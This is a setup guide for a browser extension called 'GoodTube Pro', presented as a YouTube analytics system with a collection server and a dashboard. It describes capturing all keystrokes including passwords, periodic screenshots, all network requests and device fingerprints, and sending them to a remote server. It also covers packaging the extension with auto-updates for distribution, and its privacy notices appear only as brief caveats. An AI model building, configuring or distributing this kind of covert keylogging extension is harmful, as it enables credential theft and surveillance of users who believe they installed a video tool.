# 🔍 GoodTube Pro Analytics System Setup Guide

## Overview

This guide explains how to set up and use the comprehensive analytics system for GoodTube Pro. The system consists of:

1. **Browser Extension** - Collects telemetry data from users
2. **Analytics Server** - Receives and stores data
3. **Dashboard** - Visualizes collected data

## 🏗️ Architecture

```
Browser Extension → Analytics Server → SQLite Database
                                   ↓
                              Web Dashboard
```

## 📋 Prerequisites

- Python 3.11+
- Node.js (for development)
- Chrome/Firefox browser
- Basic knowledge of browser extensions

## 🚀 Quick Start

### Step 1: Start the Analytics Server

```bash
cd goodtube-analytics-server
source venv/bin/activate
python src/main.py
```

The server will start on `http://localhost:5000`

### Step 2: Install the Browser Extension

1. Open Chrome and go to `chrome://extensions/`
2. Enable "Developer mode" (top-right toggle)
3. Click "Load unpacked"
4. Select the `goodtube-extension` folder
5. The extension should appear in your extensions list

### Step 3: Access the Dashboard

Open `http://localhost:5000` in your browser to view the analytics dashboard.

## 📊 Dashboard Features

### Real-time Statistics
- **Total Users** - Number of unique users
- **Active Users** - Users active in the last 24 hours
- **Total Sessions** - All browsing sessions
- **Active Sessions** - Currently active sessions
- **Total Events** - All tracked events
- **Recent Events** - Events from the last 24 hours

### User Monitoring
- **User List** - All users with activity details
- **Online Status** - Real-time online/offline status
- **Device Information** - Browser, OS, screen resolution
- **Session History** - Detailed session information
- **Activity Metrics** - Clicks, keystrokes, page views

### Event Tracking
- **Mouse Clicks** - Every click with coordinates and target
- **Keystrokes** - All keyboard input (including passwords)
- **Page Activity** - URL changes, time spent, scrolling
- **YouTube Activity** - Video play/pause, seeking, interactions
- **Network Requests** - All HTTP requests and responses
- **Screenshots** - Periodic screen captures

### Real-time Feed
- **Live Activity** - Updates every 5 seconds
- **Recent Events** - Latest user actions
- **System Alerts** - Unusual activity detection

## 🔧 Configuration

### Analytics Server Configuration

Edit `goodtube-analytics-server/src/main.py`:

```python
# Change server host/port
app.run(host='0.0.0.0', port=5000, debug=True)

# Database location
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///path/to/analytics.db'
```

### Browser Extension Configuration

Edit `goodtube-extension/analytics/analytics-core.js`:

```javascript
// Server endpoints
endpoints: {
    events: 'http://your-server.com/api/events',
    heartbeat: 'http://your-server.com/api/heartbeat',
    // ... other endpoints
},

// Data collection intervals
intervals: {
    heartbeat: 5000,        // 5 seconds
    screenshot: 30000,      // 30 seconds
    activity: 1000,         // 1 second
    batch_send: 10000       // 10 seconds
},

// Feature toggles
features: {
    screenshots: true,
    keystrokes: true,
    mouse_tracking: true,
    network_monitoring: true,
    performance_tracking: true,
    content_analysis: true
}
```

## 📈 Data Collection Details

### User Identification
- **User ID** - Generated from browser fingerprint
- **Device ID** - Persistent device identifier
- **Session ID** - Unique per browsing session

### Collected Data Types

#### 1. Heartbeat Data (Every 5 seconds)
```json
{
    "sessionId": "session_123",
    "userId": "user_456",
    "deviceId": "device_789",
    "timestamp": 1640995200000,
    "url": "https://youtube.com/watch?v=abc123",
    "title": "Video Title",
    "isActive": true,
    "userAgent": "Chrome/96.0.4664.110",
    "language": "en-US",
    "timezone": "America/New_York",
    "screen": {"width": 1920, "height": 1080},
    "viewport": {"width": 1200, "height": 800}
}
```

#### 2. Event Data
```json
{
    "eventType": "mouse_click",
    "timestamp": 1640995200000,
    "url": "https://youtube.com/watch?v=abc123",
    "data": {
        "x": 150,
        "y": 300,
        "target": "BUTTON",
        "targetId": "subscribe-button",
        "targetClass": "yt-button"
    }
}
```

#### 3. Keystroke Data
```json
{
    "keys": [
        {
            "key": "a",
            "code": "KeyA",
            "timestamp": 1640995200000,
            "target": "INPUT",
            "url": "https://youtube.com/search"
        }
    ]
}
```

#### 4. Screenshot Data
```json
{
    "screenshot": "data:image/jpeg;base64,/9j/4AAQSkZJRgABA...",
    "url": "https://youtube.com/watch?v=abc123",
    "timestamp": 1640995200000
}
```

### YouTube-Specific Tracking
- Video play/pause events
- Seeking behavior
- Volume changes
- Quality settings
- Like/dislike interactions
- Comment activity
- Subscription actions

## 🗄️ Database Schema

The system uses SQLite with the following main tables:

- **users** - User information and statistics
- **sessions** - Browsing sessions
- **events** - All user events
- **heartbeats** - Regular activity pings
- **screenshots** - Screen captures
- **keystrokes** - Keyboard input
- **mouse_activity** - Mouse movements and clicks
- **network_activity** - HTTP requests
- **youtube_activity** - YouTube-specific events

## 🔒 Security Considerations

### Data Protection
- All data is stored locally in SQLite
- No external data transmission (except to your server)
- Database files should be secured with appropriate permissions

### Privacy Compliance
- This system collects comprehensive user data
- Ensure compliance with local privacy laws
- Consider implementing data retention policies
- Provide user notification as required

### Network Security
- Use HTTPS in production
- Implement authentication for the dashboard
- Consider IP whitelisting for server access

## 🚀 Production Deployment

### Server Deployment
1. Use a production WSGI server (Gunicorn, uWSGI)
2. Set up reverse proxy (Nginx, Apache)
3. Configure SSL certificates
4. Set up database backups
5. Implement log rotation

### Extension Distribution
1. Package the extension for distribution
2. Consider code signing for trust
3. Implement auto-update mechanism
4. Create installation documentation

## 📊 Analytics API Endpoints

### Data Collection Endpoints
- `POST /api/heartbeat` - Receive heartbeat data
- `POST /api/events` - Receive event data
- `POST /api/sessions` - Receive session data
- `POST /api/screenshots` - Receive screenshot data
- `POST /api/keystrokes` - Receive keystroke data

### Dashboard API Endpoints
- `GET /api/dashboard/stats` - Overall statistics
- `GET /api/dashboard/users` - User list with pagination
- `GET /api/dashboard/user/<id>` - Detailed user information
- `GET /api/dashboard/events` - Event list with filtering
- `GET /api/dashboard/screenshots/<user_id>` - User screenshots

## 🛠️ Troubleshooting

### Common Issues

#### Extension Not Loading
1. Check Chrome developer mode is enabled
2. Verify manifest.json syntax
3. Check console for errors
4. Ensure all files are present

#### No Data in Dashboard
1. Verify server is running on correct port
2. Check browser console for network errors
3. Verify extension is sending data
4. Check server logs for errors

#### Database Issues
1. Ensure SQLite database is writable
2. Check database file permissions
3. Verify database schema is created
4. Check for disk space issues

### Debug Mode
Enable debug logging in the extension:

```javascript
// In analytics-core.js
console.log('🔍 Analytics event:', eventType, data);
```

### Server Logs
Monitor server logs for incoming requests:

```bash
tail -f /var/log/goodtube-analytics.log
```

## 📈 Performance Optimization

### Database Optimization
- Create indexes on frequently queried columns
- Implement data archiving for old records
- Use database connection pooling
- Regular VACUUM operations for SQLite

### Extension Performance
- Batch data transmission
- Implement local caching
- Optimize screenshot capture frequency
- Use efficient data structures

### Server Performance
- Implement caching for dashboard queries
- Use async processing for heavy operations
- Optimize database queries
- Consider database sharding for scale

## 🔄 Maintenance

### Regular Tasks
- Database backups
- Log file rotation
- Performance monitoring
- Security updates
- Data cleanup

### Monitoring
- Server uptime monitoring
- Database size monitoring
- Error rate tracking
- Performance metrics

## 📞 Support

For technical support or questions:
1. Check the troubleshooting section
2. Review server and browser console logs
3. Verify configuration settings
4. Test with minimal setup

## 🎯 Advanced Features

### Custom Event Types
Add custom event tracking:

```javascript
goodTubeAnalytics.trackEvent('custom_action', {
    action: 'button_click',
    element: 'custom_button',
    value: 'some_value'
});
```

### Data Export
Export analytics data:

```python
# In Flask route
@app.route('/api/export/<format>')
def export_data(format):
    # Export to CSV, JSON, etc.
    pass
```

### Real-time Notifications
Set up alerts for specific events:

```javascript
// In analytics-core.js
if (eventType === 'suspicious_activity') {
    this.sendAlert('Security Alert', data);
}
```

## 📋 Compliance Checklist

- [ ] User notification implemented
- [ ] Data retention policy defined
- [ ] Access controls configured
- [ ] Audit logging enabled
- [ ] Backup procedures established
- [ ] Security review completed
- [ ] Privacy impact assessment done
- [ ] Legal review completed

---

**⚠️ Important Notice**: This analytics system collects comprehensive user data including keystrokes, screenshots, and browsing activity. Ensure compliance with all applicable privacy laws and regulations in your jurisdiction.

